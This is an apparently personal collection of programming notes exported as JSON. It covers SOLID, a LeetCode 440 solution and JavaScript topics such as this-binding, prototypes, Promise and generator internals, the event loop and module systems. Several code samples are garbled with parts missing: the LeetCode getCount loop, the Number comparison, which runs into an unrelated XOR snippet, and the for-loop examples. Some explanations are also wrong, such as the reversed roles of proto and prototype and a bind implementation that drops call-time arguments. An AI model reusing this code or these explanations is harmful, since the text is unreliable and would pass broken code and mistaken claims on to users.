{"essay.html":{"content":"一些随笔\n\n2021\n\n组织思路的一些方法论\n\n2022\n\n对于前端构建的一点思考\n关于学习的思考\n","title":"一些随笔"},"solid.html":{"content":"Software SOLID Design Principles\n\nSingle-responsiblity principle\n\nOpen-closed principle\n\nLiskov substitution principle\n\nInterface segregation principle\n\nDependency Inversion Principle\n","title":"Software SOLID Design Principles"},"440.k-th-smallest-in-lexicographical-order.html":{"content":"440. K-th Smallest in Lexicographical Order\n\nsource:\n\nQuestion\n\nGiven two integers n and k, return the kth lexicographically smallest integer in the range [1, n].\n\n暴力法\n\n这道题比较自然的反应是生成数组，然后排序，再通过数组索引选择。\n\nvar findKthNumber = function(n, k) {\n    return Array(n).fill(0).map((_, i) => ${i + 1}).sort()[k - 1];\n};\n\n这样子的时间复杂度在O(nlogn), 空间复杂度在O(logn). 这道题n的数字会很大，会导致oom.\n\n字典树\n\n这题的核心在于，字典树就是一个十叉树的结构，而对于一个树形的结构，因为已知总节点数，他的某个子节点数是可计算的。\n\n通过这个原理：\n\n如果此节点下的子节点数小于k，说明k在子节点内，继续以第一个子节点为节点计算\n如果此节点下的子节点数大于k，说明k不在子节点内，继续以下一个兄弟节点为节点计算\n\n/**\n @param {number} n\n @param {number} k\n @return {number}\n */\nvar findKthNumber = function (n, k) {\n  const getCount = prefix => {\n    let cur = prefix;\n    let next = prefix + 1; //下一个前缀\n    let count = 0;\n    //当前的前缀当然不能大于上界\n    while (cur  k) {\n      //第k个数在当前前缀下\n      prefix *= 10;\n      p++; //把指针指向了第一个子节点的位置，比如11乘10后变成110，指针从11指向了110\n    } else if (p + count <= k) {\n      //第k个数不在当前前缀下\n      prefix++;\n      p += count; //注意这里的操作，把指针指向了下一前缀的起点\n    }\n  }\n  return prefix;\n};\n\n总结\n\n这道题是以字典树为基础去做计算，注意一些细节，平时多熟悉类似题目。\n","title":"440. K-th Smallest in Lexicographical Order"},"study_dash.html":{"content":"","title":""},"code.html":{"content":"Coding Playground\n\nThe place I can organize my thoughts and review knowledge.\n\nWeb\n\nJS\n\nthis\nprototype\nNumber\nFor Loop\nClosure\nPromise\nGenerator\nEvent Loop\nModule\nNode Debug\nNode Package Manager\nStream and Buffer\nUtility Functions\n\nRust\n\nSmart Points\n\nBrowser\n\nWeb request\nWeb cache\nWeb security\nWeb Frontend Performance\nWeb Content Negotiation\nWeb Worker\nWeb Event\nWebAssembly\nBrowser Rendering\nrequestAnimationFrame\nService Worker\nV8 byte code\n\nCSS\n\nBox model\nPseudo Classes\n\nFramework\n\nReact: Reconciliation\nReact: Isomorphic\nReact: Route\nReact: Event\nReact: Hooks\nVue: Template Syntax\nVue: Object Proxy\nVue: Life Cycle\n\nOther\n\nDeep copy and Shallow copy\nArray Functions\nThrottle and debounce\nCORS\nMemory Leak\nWebpack Optimization\nIssue a npm package\nRedux\nRxJS\nReact Native Bridges\nTS Utility Types\nCross-Platform Framework for Mini Program\n\nCommon\n\nAlgorithm\n\nBasic Concepts\nSorting\nHash\nDynamic Programming\nTail Recursion\n\nNetwork\n\nHierarchical Network Modal\nIP\nUDP\nTCP\nHttp\nHttp2\nHttps\nWebSocket\nWebRTC\n\nOS\n\nSocket\nCommon Linux Commands\nText Encoding Standards\ninode\n\nDesign Patterns\n\nFP and OOP\nAOP and The Onion Model\nDI and Factory Pattern\nSOLID Design Principles\n","title":"Coding Playground"},"leetcode.html":{"content":"Leetcode\n\nLinked List\n\n2. Add Two Numbers\n21. Merge Two Sorted Lists\n25. Reverse Nodes in k-Group\n138. Copy List with Random Pointer\n146. LRU Cache\n206. Reverse Linked List\n\nBinary Tree\n\nTraverse Binary Tree Collection: 297, 105, 102, 103, 107, 144, 103, 987, 94, 145\n95&96. Unique Binary Search Trees\n98. Validate Binary Search Tree\n105&106. Construct Binary Tree from Preorder and Inorder Traversal/Construct Binary Tree from Inorder and Postorder Traversal\n112. Path Sum\n114. Flatten Binary Tree to Linked List\n116&117. Populating Next Right Pointers in Each Node I && II\n236. Lowest Common Ancestor of a Binary Tree\n1448. Count Good Nodes in Binary Tree\n\nBinary Search Tree\n\nTraverse BST\n\n230&538&1038. BST inorder traverse\n\nOperate BST\n\n450. Delete Node in a BST\n701. Insert into a Binary Search Tree\n\nDynamic Programming\n\n5. Longest Palindromic Substring\n42. Trapping Rain Water\n70. Climbing Stairs\n121. Best Time to Buy and Sell Stock\n\nDivide And Conquer Method\n\n347. Top K Frequent Elements\n\nGraphics\n\nSorting\n\nTwo Pointers\n\n3. Longest Substring Without Repeating Characters\n11. Container With Most Water\n15. 3Sum\n76. Minimum Window Substring\n\nBacktracking\n\n22. Generate Parentheses\n46. Permutations\n\nBinary Search\n\n4. Median of Two Sorted Arrays\n33. Search in Rotated Sorted Array\n\nOthers\n\n1. Two Sum\n7. Reverse Integer\n20. Valid Parentheses\n31. Next Permutation\n54. Spiral Matrix\n56. Merge Intervals\n200. Number of Islands\n415. Add Strings & 43. Multiply Strings\n440. K-th Smallest in Lexicographical Order","title":"Leetcode"},"this.html":{"content":"this\n\nIn most cases, the value of this is determined by how a function is called (runtime binding). It can't be set by assignment during execution, and it may be different each time the function is called.\n\nRuntime binding\n\nThere is a demo:\n\nfunction bike() {\n  console.log(this.name);\n}\n\nvar name = \"Ninja\";\nvar obj1 = { name: \"Pulsar\", bike: bike };\nvar obj2 = { name: \"Gixxer\", bike: bike };\n\nbike();           // \"Ninja\"\nobj1.bike();      // \"Pulsar\"\nobj2.bike();      // \"Gixxer\"\n\napply, call and bind\n\nThese three functions are able to change this value in a function when it calls them.\n\nbind will change this but not run the function. A function can only be bind once.\ncall will change this and run it.\napply will change this, and params will be passed as an array.\n\nfunction fn(a, b) {\n    console.log(this, a, b);\n}\n\nconst bindFn = fn.bind({});\nfn.call({}, 1, 2);\nfn.apply({}, [1, 2]);\n\nnew a Class in JS\n\nThe new keyword in front of any function turns the function call into constructor call and below things occurred when new keyword put in front of function:\n\nA brand new empty object gets created\nnew empty object gets linked to prototype property of that function\nsame new empty object gets bound as this keyword for execution context of that function call\nif that function does not return anything then it implicit returns this object.\n\nThe code is as below:\n\nfunction _new(obj, ...rest){\n  // 1 and 2\n  const newObj = Object.create(obj.prototype);\n  // 3\n  const result = obj.apply(newObj, rest);\n  // 4\n  return typeof result === 'object' ? result : newObj;\n}\n\nWrite a bind\n\nFunction.prototype.myBind = function(...args) {\n\tconst thisObj = args.shift();\n\tconst self = this;\n\treturn () => self.apply(thisObj, args);\n}\n\nPrecedence of this keyword bindings\n\nFirst it checks whether the function is called with new keyword.\nSecond it checks whether the function is called with call() or apply() method means explicit binding.\nThird it checks if the function called via context object (implicit binding).\nDefault global object (undefined in case of strict mode).\n\nStrict mode\n\nunder use strict;, global this won't point to window, instead, it points to undefined.\n\n(function() {\n    'use strict';\n    console.log(this); // undefined\n})();\n\n(function() {\n    console.log(this); // window\n})();\n\nAnd strict mode not allows global variable mistypeVariable exists.\n\n(function() {\n    'use strict';\n    a = 1; // Uncaught ReferenceError: a is not defined\n})();\n\n(function() {\n    a = 1; // window.a = 1;\n})();\n\nReference\n\nMDN Strict mode:\n","title":"this"},"prototype.html":{"content":"Prototype\n\nUnlike some of class-based languages, like Java and Cpp, JS uses prototype chain to implement inheritance.\n\nJavaScript only has one construct: objects.\n\nproto and prototype\n\nEach object has a private property which holds a link to another object called its prototype.\n\nThe constructor function has proto and its instance has prototype property, they point to the same prototype object.\n\nThe basic structure is as below:\n\nThat prototype object has a prototype of its own, and so on until an object is reached with null as its prototype. By definition, null has no prototype, and acts as the final link in this prototype chain.\n\nThe link looks like as below:\n\nThere is an example to use prototype to inherit properties:\n\nfunction Person() {\n    this.name = 'Bert';\n}\n\nfunction Man() {\n    this.gender = 'male';\n}\n\nMan.prototype = new Person();\nMan.prototype.constructor = Man;\n\nconst man = new Man();\n\ninstanceof and Object.isPrototypeOf\n\nisPrototypeOf() differs from the instanceof operator. In the expression \"object instanceof AFunction\", the object prototype chain is checked against AFunction.prototype, not against AFunction itself.\n\na instanceof A\nA.prototype.isPrototypeOf(a);\n\na.proto === A.prototype\n\nconstructor\n\nThe constructor property returns a reference to the Object constructor function that created the instance object.\n\nNote that the value of this property is a reference to the function itself, not a string containing the function's name.\n\nThere is an example to use it:\n\nfunction Person() {\n    this.name = 'Bert';\n}\n\nfunction Man() {\n    Person.call(this);\n    this.gender = 'male';\n}\n\nconst man = new Man();\n\nNotice: Unlike the object defined in prototype which will be shared within its all instances, the properties defined in constructor will create an object in each instantiation.\n\nCombination Inheritance\n\nCombination inheritance combines prototype chaining and constructor stealing to get the best of each approach.\n\nThe basic idea is to use prototype chaining to inherit properties and methods on the prototype, and to use constructor stealing to inherit instance properties.\n\nThis allows function reuse by defining methods on the prototype and allows each instance to have its own properties. Consider the following:\n\nfunction Person() {\n    this.name = 'Bert';\n}\n\nPerson.prototype.showName = function() {\n    console.log(this.name);\n};\n\nfunction Man() {\n    // inherit properties of Person\n    Person.call(this);\n    this.gender = 'male';\n}\n\nMan.prototype = new Person();\nMan.prototype.constructor = Man;\n\nMan.prototype.showGender = function() {\n    console.log(this.gender);\n}\n\nconst man = new Man();\n\nclass\n\nJavaScript classes, introduced in ECMAScript 2015, are primarily syntactical sugar over JavaScript's existing prototype-based inheritance.\n\nThe class syntax does not introduce a new object-oriented inheritance model to JavaScript.\n\nIt's always used with new, see more in here\n\nReference\n","title":"Prototype"},"number.html":{"content":"Number in JS\n\nPrecision\n\n0.1 + 0.2 === 0.3\n\nActually, it returns false, which counters people's institution. The reason is that JS use 64-bit floating point representation, whose problem is that numbers are represented in this format as a whole number times a power of two; rational numbers (such as 0.1, which is 1/10) whose denominator is not a power of two cannot be exactly represented.\n\nIn this way, when we have to compare floats, the appropriate way is to:\n\nNumber.prototype.compare = f => Math.abs(f - this)  {\n    const keyCode = Array.from(key).map(char => char.charCodeAt(0)).join('').substr(0, 2);  //  String.fromCharCode(char.charCodeAt(0) ^ keyCode)).join('');\n};\n","title":"Number in JS"},"for_loop.html":{"content":"For Loop\n\nfor-in VS Object.keys\n\nfor-in can access whole properties' enumerable name, including prototype.\n\nObject.keys can only access object itself properties' enumerable name, not including prototype.\n\nconst obj = { a:1 };\nconst obj2 = Object.create(obj);\nobj2.b = 2;\n\nfor (let i in obj2){\n    console.log(i)  //b, a\n}\n\nconsole.log(Object.keys(obj2)); //[\"b\"]\n\nfor-in VS for-of\n\nfor a key-value object, for-in will get its key, while key-of can get its value. For example, traverse an\narray:\n\nconst arr = [1,2,3];\nfor (let i in arr){\n    console.log(i); //0,1,2\n}\nfor (let item of arr){\n    console.log(item);  //1,2,3\n}\n\nIn fact, if it don't need to change the element of the array, forEach is better a choice. If it needs to change the element, map is better. forEach and map's second parameter thisArg can change this point in the callback.\n\nlet in for loop\n\nIn any for loop, use let to define the variable is always better than var. There is a typical example:\n\nfor (var i=0;i{\n        console.log(i); //5,5,5,5,5\n    });\n}\nfor (let i=0;i{\n        console.log(i); //0,1,2,3,4\n    });\n}\n\nthe performance impact of Nested sequence\n\nvar t1 = new Date().getTime()\nfor (let i = 0; i < 100; i++) {\n  for (let j = 0; j < 1000; j++) {\n    for (let k = 0; k < 10000; k++) {\n    }\n  }\n}\nvar t2 = new Date().getTime()\nconsole.log('first time', t2 - t1)\n\nfor (let i = 0; i < 10000; i++) {\n  for (let j = 0; j < 1000; j++) {\n    for (let k = 0; k < 100; k++) {\n\n    }\n  }\n}\nvar t3 = new Date().getTime()\nconsole.log('two time', t3 - t2)\n\nTheir loop times is the same, but their execution time is different.\n\nThe reason is that they have different variable initialization times:\n\nfirst loop:\n\n    j: 100\n    k: 1000\n\nsecond loop:\n\n    j: 10000\n    k: 10000 * 1000\n\nNormally, larger surrounding loop, poorer performance.\n","title":"For Loop"},"closure.html":{"content":"Closure\n\nJS action scope\n\nCompared to other language, in JS, lower action scope can directly visit higher action scope's variables.\nFor example:\n\nlet a = 1;\n(function (){\n  console.log(a);   //1\n})();\n\n(function (){\n    let a = 2;\n    //define the same name variables won't impact higher action scope\n  console.log(a);   //2\n})();\n\nconsole.log(a);     //1\n\nTemporal dead zone\n\nIn addition, in ES6, for let, there is a new feature named temporal dead zone, which means we can't use variables before we have declared it. In last example, we can change to:\n\nlet a = 1;\n(function (){\n  console.log(a);   //throw Error: a is not defined\n  let a = 2;\n})();\n\nAccess Data in Closure\n\nAs we can see, in last example, lower action scope is able to visit higher action scope's variables, but how can higher action scope visit lower action scope?\n\nIn JS, once function finished and GC found its variables were not refer in other places， reference count equaled 0, the variable's memory address would be recycled, so user cannot get this variables' value any more.\n\nTherefore, closure offers a way to keep temporary variables, an example as below:\n\nlet closure = (function (){\n    let a = 1;\n    let keep = function(){\n        console.log(a);\n    };\n    a = 2;\n    return keep;\n})();\nclosure();  //2\n\nNow we can visit the variable's memory address in the higher action scope.\n","title":"Closure"},"promise.html":{"content":"Promise\n\nPromise is a powerful alternative way to replace callback in JS. Compared to callback, Promise provides a better way to write coherent codes.\n\nSee its standard from Promise/A+.\n\nHow to use\n\nFirst of all, let's see its TS definition:\n\n/**\n Represents the completion of an asynchronous operation\n */\ninterface Promise {\n    /**\n     Attaches callbacks for the resolution and/or rejection of the Promise.\n     @param onfulfilled The callback to execute when the Promise is resolved.\n     @param onrejected The callback to execute when the Promise is rejected.\n     @returns A Promise for the completion of which ever callback is executed.\n     */\n    then(onfulfilled?: ((value: T) => TResult1 | PromiseLike) | undefined | null, onrejected?: ((reason: any) => TResult2 | PromiseLike) | undefined | null): Promise;\n\n    /**\n     Attaches a callback for only the rejection of the Promise.\n     @param onrejected The callback to execute when the Promise is rejected.\n     @returns A Promise for the completion of the callback.\n     */\n    catch(onrejected?: ((reason: any) => TResult | PromiseLike) | undefined | null): Promise;\n}\n\nThe first function in then is resolve function, the second function is reject function which can on catch the error from reject, not from throw.\n\nThe functions resolve and reject is to change the status of Promise.\n\nThere is a demo:\n\nconst resolveTask = () => new Promise((resolve, reject) => resolve(1))\n.then(res => {\n    console.log('resolve', res);\n    throw Error('throw error')\n}, err => {\n    console.log('reject', err);\n})\n.catch(err => console.log('catch', err));\n\nconst rejectTask = () => new Promise((resolve, reject) => reject(1))\n.then(res => {\n    console.log('resolve', res);\n    throw Error('throw error')\n}, err => {\n    console.log('reject', err);\n})\n.catch(err => console.log('catch', err));\n\n// resolve 1\n// catch Error: throw error\nresolveTask();\n// reject 1\nrejectTask();\n\nPromise implementation\n\nFor me, the key point to understand Promise's then and catch is the event-loop. Because the main thread task will be operated to the end first. So the thenList and onCatch must be ready when the first callback starts.\n\nThere is a simple example I wrote:\n\nclass MyPromise {\n    static statusList = {\n        pending: Symbol(\"pending\"),\n        resolved: Symbol(\"resolved\"),\n        rejected: Symbol(\"rejected\"),\n    };\n\n    static resolve = (p) => {\n        if (p instanceof MyPromise) return p;\n        return new MyPromise((resolve) => resolve(p));\n    };\n\n    static reject = (p) => {\n        if (p instanceof MyPromise) return p;\n        return new MyPromise((_, reject) => reject(p));\n    };\n\n    status = MyPromise.statusList.pending;\n    thenList = [];\n    onCatch = undefined;\n\n    constructor(action) {\n        action(this.resolve.bind(this), this.reject?.bind?.(this));\n    }\n\n    then(cb) {\n        this.thenList.push(cb);\n        return this;\n    }\n\n    catch(cb) {\n        this.onCatch = cb;\n        return this;\n    }\n\n    resolve(value) {\n        queueMicrotask(() => {\n            const task = this.thenList.shift().bind(this);\n            if (task) {\n                MyPromise.resolve(task(value))\n                .then(this.resolve.bind(this))\n                .catch((e) => {\n                    this.status = MyPromise.statusList.rejected;\n                    if (this.onCatch) this.onCatch(e);\n                    else throw e;\n                });\n            } else {\n                this.status = MyPromise.statusList.resolved;\n            }\n        });\n        return this;\n    }\n\n    reject(value) {\n      this.status = MyPromise.statusList.rejected;\n      if (this.onCatch) this.onCatch(value);\n      else throw new Error(value);\n      return this;\n    }\n  }\n\nvar task = () =>\n    new MyPromise((resolve) => {\n        setTimeout(() => {\n        resolve(1);\n        }, 1000);\n    }).then((v) => {\n        console.log(v);\n        return v + 1;\n    });\ntask().then((v) => console.log(v));\n\nPromise.all, Promise.race, Promise.finally and Promise.parallel\n\nAbout all and race, I know a really vivid and interesting metaphor: The all is a horse race that ends when all horses reach the terminal point, the race is a horse race that ends when the first horse reaches the terminal point.\n\nIn other word, the all will return results of all callback tasks, the race will return the callback result of the first finished task.\n\nNotice, race and all both will run the whole asynchronize task, the only different is the final returned value.\n\nTheir implements are as below:\n\nconst task = (delay: number, fail?: boolean) => new Promise((resolve, reject) => {\n    setTimeout(() => {\n      if (!fail) resolve(delay);\n      else reject(delay);\n    }, delay);\n});\n\nPromise.myRace = (tasks: Promise[]) => new Promise((resolve, reject) => {\n    tasks.forEach(async task => {\n        try {\n            const res = await task;\n            // a Promise can be resolved once\n            resolve(res);\n        } catch (e) {\n            reject(e);\n        }\n    });\n});\n\nPromise.myAll = (tasks: Promise[]) => new Promise((resolve, reject) => {\n    const res = [];\n    tasks.forEach(async task => {\n        try {\n            const data = await task;\n            res.push(data);\n            if (res.length === tasks.length) resolve(res);\n        } catch (e) {\n            reject(e);\n        }\n    });\n});\n\nPromise.prototype.myFinally = function(cb) {\n    return this.then(\n        v => Promise.resolve(cb()).then(() => v),\n        e => Promise.resolve(cb()).then(() => { throw e })\n    )\n};\n\nPromise.parallelByReduce = (tasks: Promise[]) => new Promise(async (resolve, reject) => {\n    try {\n        resolve(await tasks.reduce(async (acc, crr) => {\n            acc = await acc;\n            acc.push(await crr);\n            return acc;\n        }, []));\n    } catch (e) {\n        reject(e);\n    }\n});\n\nPromise.parallelByRecursion = (tasks: Promise[]) => new Promise(async (resolve, reject) => {\n    const res = [];\n    const iter = async () => {\n        if (tasks.length > 0) {\n            const task = tasks.shift();\n            const data = await task;\n            res.push(data);\n            iter();\n        }\n    };\n    try {\n        await iter();\n        resolve(res);\n    } catch (e) {\n        reject(e);\n    }\n});\n\nPromise.some = (tasks: Promise[], count: number) => new Promise((resolve, reject) => {\n  const ret = [];\n  if (!count || !tasks.length) return resolve(ret);\n  const errors = [];\n  tasks.forEach(async task => {\n    try {\n      const data = await task;\n      if (ret.length + 1 === count) {\n        ret.push(data);\n        resolve(ret);\n      }\n    } catch (e) {\n      if (errors.length + 1 > tasks.length - count) {\n        errors.push(e);\n        reject(errors);\n      }\n    }\n  });\n});\n\nasync & await\n\nasync and await it a better solution to replace then. Writing asynchronize codes with synchronize sequence.\n\nIf you use JS bundler, like Babel, esbuild or swc, async and await will be transferred to Generator, refer to this article.\n\nWith native async and await, async function will return an AsyncFunction object, which can be created as below (notice: it is not a global variable):\n\nObject.getPrototypeOf(async function(){}).constructor\n\nReference\n","title":"Promise"},"generator.html":{"content":"Generator\n\nBasic usage\n\nCompared to normal Function, generator function must has a *, and has its special\nproperty: next.\n\nLike in Python, yield means to relinquish the control. It makes the function is possible to\nstop, and restart by the controller.\n\nThere is a simple example:\n\nfunction* gen(arr) {\n  for (let i of arr){\n      yield i;\n  }\n}\n\nvar it = gen([1,2,3]);\nit.next();  //value: 1, done: false\nit.next();  //value: 2, done: false\nit.next();  //value: 3, done: false\nit.next();  //value: undefined, done: true\n\nIn addition, in next, it can put a new parameter like as below:\n\nfunction* gen(arr) {\n  for (let i of arr){\n      var result = yield i;\n      console.log(result);\n  }\n}\nvar it = gen([1,2,3]);\nit.next(1);  //\nit.next(2);  //2\nit.next(3);  //3\nit.next(4);  //4\n\nAs we can see, the first it.next(1) did not log anything. The reason is that in generator, the next will only execute to\nyield, so in the first next, the variable result is not assigned. To prove it:\n\nfunction* gen(arr) {\n    var container ={};\n    Object.defineProperty(container, 'result', {\n        set:function () {\n            console.log('result is defined');\n        }\n    });\n    for (let i of arr){\n        container.result = yield i;\n        console.log(container.result);\n    }\n}\nvar it = gen([1,2,3]);\nit.next(1);  //\nit.next(2);  //result is defined\nit.next(3);  //result is defined\nit.next(4);  //result is defined\n\nasync and await\n\nFirstly, let's see how typescript to transfer it, see in here which is based on ES5:\n\n//origin\nconst run = async () => {\n  await 'start';\n  const a = await 'finished';\n  return a;\n}\n\n// transfer. remove some irrelevant codes\nvar __awaiter = function (generator) {\n  function adopt(value) {\n    return value instanceof Promise\n      ? value\n      : new Promise(function (resolve) {\n          resolve(value);\n        });\n  }\n  return new Promise(function (resolve, reject) {\n    function fulfilled(value) {\n      try {\n        step(generator.next(value));\n      } catch (e) {\n        reject(e);\n      }\n    }\n    function rejected(value) {\n      try {\n        step(generator\"throw\");\n      } catch (e) {\n        reject(e);\n      }\n    }\n    function step(result) {\n      result.done\n        ? resolve(result.value)\n        : adopt(result.value).then(fulfilled, rejected);\n    }\n    step((generator = generator()).next());\n  });\n};\nconst run = () =>\n  __awaiter(function* () {\n    yield \"start\";\n    const a = yield \"finished\";\n    return a;\n  });\n\nAs we can see, babel use generator + Promise to transfer aysnc + await,\nas yield can wait until the Promise finished.\n\nThere is a more simple function, but the principle is the same:\n\nfunction* gen(task, pages) {\n    for (let page of pages){\n        yield task(page);\n    }\n}\n\nvar it = gen(task, [1,2]);\n\nwhile (true){\n    let result = it.next();\n    result.value.then(data=>{\n        console.log(data);\n    });\n    if (result.done){\n        break;\n    }\n}\n\nIn Addition, if we want to transfer async/await to compatible with ES3, the compiler will add a generator help function.\n\nSee a demo:\n\nasync function test() {\n  return new Promise((r) => {\n    console.log(0);\n    r();\n  });\n}\n\nasync function run() {\n  await test();\n  console.log(1);\n}\n\nrun();\nnew Promise((r) => {\n  r();\n}).then(() => {\n  console.log(2);\n}).then(() => {\n  console.log(3);\n}).then(() => {\n  console.log(4);\n})\n\n// 0 2 3 1 4\n\nThere will be two promises when await test()!.\n","title":"Generator"},"event_loop.html":{"content":"Event Loop\n\nJavaScripts' biggest feature is its event loop, because of it, we can ignore details of threads and focus on those codes which can create real worth.\n\nEvent loop is responsible for executing the code, collecting and processing events, and executing queued sub-tasks.\n\nTasks and MicroTasks\n\nA task is any JavaScript scheduled to be run by the standard mechanisms such as initially starting to execute a program, an event triggering a callback, and so forth.\n\nCompared to task, microtasks will be executed until its queue is empty.\n\nThe sequence is like:\n\nclear one task => clear all microtasks => clear one task => clear all microtasks ....\n\nMicrotasks includes Promise, queueMicrotask, MutationObserver and process.nextTick on Node.js.\n\nMarcoTasks includes setTimeout, setInterval, requestAnimationFrame.\n\nThere is a typical codes to show it:\n\nsetTimeout(() => console.log(4));\n\nnew Promise(resolve => {\n  resolve();\n  console.log(1);\n}).then(() => {\n  console.log(3);\n});\n\nconsole.log(2);\n\n// 1 2 3 4\n\nIn Browser\n\nIn modern browsers, there are 3 different types of event loop is running.\n\nWindow Event Loop\n\nIt drives all of the windows sharing a similar origin.\n\nWorker event loop\n\nIt includes all forms of workers, such as web worker, shared workers and service workers. Workers are kept in one or more agents that are separate from the \"main\" code; the browser may use a single event loop for all of the workers of a given type or may use multiple event loops to handle them.\n\nWorklet Event Loop\n\nA worklet event loop is the event loop used to drive agents which run the code for the workelets for a given agent. This includes worklets of type Worklet, AudioWorklet, and PaintWorklet.\n\nNode.js\n\nIn Node.js, event loop is quite different from browsers. As it don't have render tasks and have more I/O tasks.\n\nWhen Node.js starts, it initializes the Event loop, processes the provided input script which may make async API calls, then begins processing the Event loop.\n\nThere is only one thread and that is the thread Event loop runs on. Event loop works in a cyclical order, with different phases. The order of operation of Event loop is shown below.\n\ntimers: this phase executes callbacks scheduled by setTimeout() and setInterval().\npending callbacks: executes I/O callbacks deferred to the next loop iteration.\nidle, prepare: only used internally.\npoll: retrieve new I/O events; execute I/O related callbacks (almost all with the exception of close callbacks, the ones scheduled by timers, and setImmediate()); node will block here when appropriate.\ncheck: setImmediate() callbacks are invoked here.\nclose callbacks: some close callbacks, e.g. socket.on('close', ...).\n\nWhen each time switching phase, the event loop will clear whole microtasks in the loop.\n\nPoll\n\nThe poll phase has two main functions:\n\nCalculating how long it should block and poll for I/O, then\nProcessing events in the poll queue.\n\nWhen the event loop enters the poll phase and there are no timers scheduled, one of two things will happen:\n\nIf the poll queue is not empty, the event loop will iterate through its queue of callbacks executing them synchronously until either the queue has been exhausted, or the system-dependent hard limit is reached.\n\nIf the poll queue is empty, one of two more things will happen:\n\n    If scripts have been scheduled by setImmediate(), the event loop will end the poll phase and continue to the check phase to execute those scheduled scripts.\n\n    If scripts have not been scheduled by setImmediate(), the event loop will wait for callbacks to be added to the queue, then execute them immediately.\n\nOnce the poll queue is empty the event loop will check for timers whose time thresholds have been reached. If one or more timers are ready, the event loop will wrap back to the timers phase to execute those timers' callbacks.\n\nReference\n","title":"Event Loop"},"module.html":{"content":"JS的模块化和不同模块规范在webpack中的实现\n\n不说一些虚的概念，我们只看最后的执行代码。为了更好的体验场景，推荐clone一下webpack-module-demo，实际跑一下看下结果～～～\n\ngit clone https://github.com/Bert0324/webpack-module-demo.git\n\nWhy we need Module in JS\n\n可以参考一下webpack对于module的定义，虽然webpack的module和js的module还是有区别的，但是从内核上讲我觉得是一样的：\n\nDiscrete chunks of functionality that provide a smaller surface area than a full program. Well-written modules provide solid abstractions and encapsulation boundaries which make up a coherent design and clear purpose.\n\n提供了一个更小表面积的离散功能块。相比于一大坨程序写在一起，module可以帮助我们拆分和组织代码。\n\n特别的是，和其他语言不同，js的模块必须同时考虑本地加载和浏览器加载这两种情况。因为这二者的差异和特点，衍生出了同步异步，执行时机等不同。这二者核心的不同，我觉得还是io速度的不同，以下有一个对比：\n\nCommonJS\n\nCommonJS一开始主要用于Node端的模块化方案, 特点是同步/阻塞式加载，使用时加载，module和require等对象通过模块加载wrapper传入。关于CommonJS可以参考下这篇文章。\n\nCommonJS很受欢迎，那我们能不能在浏览器端也使用类似的加载方法？于是有了AMD，CMD和UMD。\n\nAsync Module Definition and RequireJS\n\nRequireJS是AMD规范的一个实现，最开始接触js的时候我还以为RequireJS是CommonJS的实现, 因为都有个require, 但其实AMD是CommonJS的浏览器变种。和CommonJS不同，AMD是专门为浏览器环境设计的。\n\n一个典型的使用如下：\n\ndefine(['dependency1', 'dependency2'], (dependency1, dependency2) => {\n    // dependency1 and dependency2 两个模块此时已经被下载并执行完了\n});\n\n// 使其贴近CommonJS的一个sugar\ndefine(['require', 'dependency1', 'dependency2'], (require) => {\n    // 看起来和CommonJS差不多，但是其实执行时机完全不同\n    const dependency1 = require('dependency1');\n    const dependency2 = require('dependency2');\n});\n\n通过define函数将模块都加载在闭包中，避免了全局污染，加载时有几个特点：\n\n依赖前置，所有的依赖会被预先在一块声明\n加载完的回调函数会在所有模块被下载完并执行好之后再执行\n\nCommon Module Definition and SeaJS\n\nSeaJS是CMD规范的一个实现，算是对AMD规范的一个加强，起源于国内，用的比较多的也是国内。作者是玉伯, 语雀就是他团队的作品之一，他有一篇关于模块化的文章，深扒了以下模块化的历史，有兴趣的可以了解下。\n\n显而易见，AMD所有模块都要预先加载执行，对于那些暂时不用的模块，造成了浪费，对于执行时机也很容易造成一些confuse的地方。CMD就是针对此进行了改进。\n\nCMD一个典型的使用如下：\n\ndefine((require, exports, module) => {\n    // dependency1执行完之后才会执行dependency2\n    const dependency1 = require(\"dependency1\");\n    const dependency2 = require(\"dependency2\");\n});\n\n和AMD相比，CMD会在解析完主文件的模块之后再都预先下载完所有模块，但是模块的执行，会在其被require之后再被执行。\n\nUniversal Module Definition\n\nCommonJS和AMD是针对不同平台的，为了让一份代码可以兼容两个平台（其实这需求个人感觉蛮奇怪的），就有了UMD规范。其实实现相当简单，我们可以看一下webpack当把output.libraryTarget设定为umd时输出的代码，完整代码可见这里：\n\n(function webpackUniversalModuleDefinition(root, factory) {\n\tif(typeof exports === 'object' && typeof module === 'object')\n\t\tmodule.exports = factory();\n\telse if(typeof define === 'function' && define.amd)\n\t\tdefine([], factory);\n\telse if(typeof exports === 'object')\n\t\texports[\"webpack-module-demo\"] = factory();\n\telse\n\t\troot[\"webpack-module-demo\"] = factory();\n})(window, function(){})\n\n首先会判断以下exports和module是否存在(CommonJS规范是否可用, 或者说是不是node环境), 如果不是，会再检查是不是有amd加载方法，如果还没有，会检查exports这个对象是否存在，如果都没，最后挂在window下面。\n\nES6 Module\n\n先来看一下MDN对于import关键字的解释，只能在type=\"module\"的script中使用，或者在import()函数体中。\n\n在这个例子中，多个文件引入esm.js这个模块，只会被加载一次。\b而且和webpack打包后的结果有一个区别，原生esm引入default是会有一个实际对象的。\n\n在PerformanceResourceTiming里，esm引入的模块，initiatorType是other, 不知道是什么原因，值得注意一下。\n\n和CommonJS，AMD，CMD，UMD不同，ES6是JS自己本身的规范，但是鉴于浏览器支持性的不足，现在绝大部分es6 module的代码仍然会被编译成兼容性更好的代码，从这个角度讲，es6 module和前面的这几个规范，又没有本质性的不同。\n\nes6 module和CommonJS最大的区别包括：\n\nCommonJS模块输出的是一个值的拷贝，ES6 模块输出的是值的引用\nCommonJS 模块是运行时加载，ES6 模块是编译时输出接口\n\n说起来其实有点抽象，我们来实际对比一下webpack输入的代码，看一下他们实现上的差异到底是什么。\n\n在webpack-module-demo中yarn build，会有es6模块的源代码和输出代码， 用CommonJS模块的源代码和输出代码。然后分别yarn serve和MODULE=es6 yarn dev，MODULE=commonJS yarn dev。\n\n在浏览器端和用node执行的结果一致，可以看到es6中sideEffectValue中的值被改变了，但是commonJS中没有。\n\n// CommonJS\nstatic import  // CommonJS执行了未使用的引入模块的上下文\n{}\n1 1\n1 1\n2 2\n1 2     // sideEffectValue值仍然是1\n\n// es6\n{}\n1 1\n1 1\n2 2\n2 2     // 